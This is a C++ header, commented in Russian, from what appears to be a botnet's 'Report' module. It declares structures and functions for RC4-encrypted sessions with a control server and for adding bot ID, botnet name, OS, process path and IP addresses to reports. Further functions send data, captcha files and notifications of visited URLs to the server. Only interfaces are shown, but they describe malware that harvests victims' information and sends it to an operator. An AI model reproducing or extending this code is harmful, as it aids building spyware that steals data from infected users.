/*
  Сбор и отправка отчетов.
*/
#pragma once

#include "..\common\crypt.h"
#include "..\common\binstorage.h"
#include "..\common\threadsgroup.h"

namespace Report
{
  typedef struct _SERVERSESSION
  {
    LPSTR url; //URL сервера.

    /*
      Функция вызываемая для формирования запроса.

      IN loop    - номер запроса для текущего соединения.
      IN session - данные сессии указаные в StartServerSession. Но pSession->pPostData - будет
                   содержать копию оригинального pSession->pPostData, которую вы можете свободно
                   изменять внутри этой функции, все изменения будут уничтожены сразу после
                   выполенния запроса. Приминять функцию BinStorage::_pack нельзя.

      Return     - SSPR_*
    */
    typedef int (*REQUESTPROC)(DWORD loop, _SERVERSESSION *session);
    REQUESTPROC requestProc;

    /*
      Функция вызываемая для обработки результата запроса (ответа сервера). Вызывается только в
      случаи успешного применения BinStorage::_unpack для ответа сервера.

      IN loop    - номер запроса для текущего соединения.
      IN session - данные сессии указаные в StartServerSession. Но pSession->pPostData - будет
                   содержать ответ сервера (уже обработаный BinStorage::_unpack). Указатель будет
                   уничтожен сразу после выхода из этой функции.

      Return     - SSPR_*
    */
    typedef int (*RESULTPROC)(DWORD loop, _SERVERSESSION *session);
    RESULTPROC resultProc;

    HANDLE stopEvent; //Сигнал прирывания.

    //Данные о ключе шифрования для pPostData. Ключ не будет менятся в ходе обработки запросов.
    Crypt::RC4KEY *rc4Key;

    BinStorage::STORAGE *postData; //Пост данные для оправки. При передачи на _Run может быть как NULL,
                                   //Так уже и созданная. Но не после BinStorage::_pack!

    void *customData; //Допольнительные данные для внешних функций.
  }SERVERSESSION;

  //Коды выхода для REQUESTPROC.
  enum
  {
    SSPR_CONTUNUE, //Продложить выполенение.
    SSPR_END,      //Сессия закончена.
    SSPR_ERROR     //Сессия закончена с ошибкой.
  };

  //Основные типы информация для добавления в лог.
  enum
  {
    BIF_BOT_ID       = 0x01, //Добавление BOTID и ботнет.
    BIF_BOT_VERSION  = 0x02, //Добавление версии бота.
    BIF_TIME_INFO    = 0x04, //Добавление данных о времени.
    BIF_OS           = 0x08, //Добавление информации об OS.
    BIF_PROCESS_FILE = 0x10, //Путь процесса.
    BIF_IP_ADDRESSES = 0x20, //Список IP-адресов.
  };

  /*
    Инициализация.
  */
  void init(void);

  /*
    Деинициализация.
  */
  void uninit(void);

  /*
    Добавление базовой информации в отчет.

    IN OUT binStorage - конфигруция(отчет). Если на входе *pph == NULL, то функция создаст новую
                        конфигурацию
    IN flags          - флаги BIF_*.

    Return            - true - в случаи успеха, 
                        false - в случаи ошибки.
  */
  bool addBasicInfo(BinStorage::STORAGE **binStorage, DWORD flags);

  /*
    Запуск сессии с сервером.

    IN session - сессия. 

    Return     - true - в случаи успешного заверщения сессии (соединение, корректность пакетов,
                 возврата SSPR_END от *_PROC)
                 false - в любом другом случаи.
  */
  bool startServerSession(SERVERSESSION *session);

  // Send data to server
  bool writeData(DWORD type, LPWSTR sourcePath, void *data, DWORD dataSize);

  bool writeIStream(DWORD type, LPWSTR sourcePath, IStream *data);
  
  // Send string to server
  bool writeString(DWORD type, LPWSTR sourcePath, LPWSTR string, DWORD stringSize);
  
  /*
    Send captcha file to server.

    IN path     - captcha file name.
    IN data     - captcha data.
    IN dataSize - captcha data size.

    Return      - true - success
                  false - failure
  */
  bool writeCaptcha(LPWSTR path, void *data, DWORD dataSize);

  /*
	Send notification to server about visited URL.

	IN url - URL that triggered notification.
  */
  void sendNotification(LPSTR url);
};
